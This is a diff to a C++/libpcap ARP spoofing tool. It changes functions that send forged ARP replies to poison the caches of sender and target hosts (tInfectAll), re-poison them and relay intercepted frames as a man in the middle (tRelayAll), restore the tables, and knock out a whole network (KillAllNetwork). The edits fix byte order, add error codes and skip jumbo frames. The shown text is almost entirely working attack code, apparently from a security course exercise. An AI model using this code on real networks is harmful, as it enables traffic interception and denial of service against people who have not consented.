@@ -427,7 +427,7 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 		for(int i = 0; i < listSize; i++){
 			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(pktArpRepInfectSenderList.at(i))), sizeof(EthArpPacket));
 			if (res != 0) {
-				fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+				fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 				pcap_close(handle);
 				return;
 			}
@@ -435,7 +435,7 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 
 			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpRepInfectTargetList.at(i)), sizeof(EthArpPacket));
 			if (res != 0) {
-				fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+				fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 				pcap_close(handle);
 				return;
 			}
@@ -505,14 +505,16 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 				5 6.758103642 targetMac → senderMac	ARP Who has senderIp? Tell targetIp.
 				6 8.030756996 targetMac → Broadcast	ARP Who has senderIp? Tell targetIp.
 			*/
-			EthArpPacket* pktEthArp = (EthArpPacket*)rawRecv;
+			//pktEthArp->arp_.sip_ == SenderIpList_.at(i)
 			for(int i = 0; i < listSize; i++){
+				EthArpPacket* pktEthArp = (EthArpPacket*)rawRecv;
 				if (pktEthArp->eth_.smac_ == SenderMacList_.at(i)
-				 && pktEthArp->arp_.op_ == ArpHdr::Request
+				 && pktEthArp->arp_.op_ == htons(ArpHdr::Request)
 				 && pktEthArp->arp_.smac_ == SenderMacList_.at(i)
-				 && pktEthArp->arp_.sip_ == SenderIpList_.at(i)
+				 && (uint32_t)pktEthArp->arp_.sip_ == htonl(SenderIpList_.at(i))
 				 && pktEthArp->arp_.tmac_ == Mac().nullMac()
-				 && pktEthArp->arp_.tip_ == TargetIpList_.at(i)){
+				 && (uint32_t)pktEthArp->arp_.tip_ == htonl(TargetIpList_.at(i))){
+					printf("[1]: IF\n");
 					if ((pktEthArp->eth_.dmac_ == MyMac_) || pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
 						EthArpPacket pktSmartInfect;
 						pktSmartInfect.eth_.smac_ = MyMac_;
@@ -532,7 +534,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 							// @Todo1 Not expired: ARP request from sender, unicast to me.
 							res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
 							if (res != 0) {
-								fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+								fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 								pcap_close(handle);
 								return;
 							}
@@ -545,7 +547,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 							for (int j = 0; i < nRetry; i++){
 								res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
 								if (res != 0) {
-									fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+									fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 									pcap_close(handle);
 									return;
 								}
@@ -555,11 +557,12 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 					}
 				}
 				else if (pktEthArp->eth_.smac_ == TargetMacList_.at(i)
-				 && pktEthArp->arp_.op_ == ArpHdr::Request
+				 && pktEthArp->arp_.op_ == htons(ArpHdr::Request)
 				 && pktEthArp->arp_.smac_ == TargetMacList_.at(i)
-				 && pktEthArp->arp_.sip_ == TargetIpList_.at(i)
+				 && (uint32_t)pktEthArp->arp_.sip_ == htonl(TargetIpList_.at(i))
 				 && pktEthArp->arp_.tmac_ == Mac().nullMac()
-				 && pktEthArp->arp_.tip_ == SenderIpList_.at(i)){
+				 && (uint32_t)pktEthArp->arp_.tip_ == htonl(SenderIpList_.at(i))){
+					printf("[2]: IF\n");
 					if ((pktEthArp->eth_.dmac_ == MyMac_) || pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
 						EthArpPacket pktSmartInfect;
 						pktSmartInfect.eth_.smac_ = MyMac_;
@@ -578,7 +581,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 						if (pktEthArp->eth_.dmac_ == MyMac_){
 							res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
 							if (res != 0) {
-								fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+								fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 								pcap_close(handle);
 								return;
 							}
@@ -589,7 +592,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 							for (int j = 0; i < nRetry; i++){
 								res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
 								if (res != 0) {
-									fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+									fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 									pcap_close(handle);
 									return;
 								}
@@ -617,9 +620,14 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 					uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
 					memcpy((void*)originalDstMacPtr, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6);
 
+					if (1500 < header->caplen){
+						fprintf(stderr, "skip jumbo frame.\n");
+						break;
+					}
+
 					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
 					if (res != 0) {
-						fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+						fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 						pcap_close(handle);
 						return;
 					}
@@ -636,9 +644,14 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 					uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
 					memcpy((void*)originalDstMacPtr, (uint8_t*)(SenderMacList_.at(i)), sizeof(uint8_t) * 6);
 
+					if (1500 < header->caplen){
+						fprintf(stderr, "skip jumbo frame.\n");
+						break;
+					}
+
 					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
 					if (res != 0) {
-						fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+						fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 						pcap_close(handle);
 						return;
 					}
@@ -709,7 +722,7 @@ void RecoverArpTables(const char* deviceName_, Mac MyMac_,
 	for(int i = 0; i < pktArpRepRecoverList.size(); i++){
 		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(pktArpRepRecoverList.at(i))), sizeof(EthArpPacket));
 		if (res != 0) {
-			fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+			fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 			pcap_close(handle);
 			return;
 		}
@@ -768,7 +781,7 @@ void KillAllNetwork(const char* deviceName_, Ip gatewayIp_){
 	{
 		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
 		if (res != 0) {
-			fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+			fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 			pcap_close(handle);
 			return;
 		}
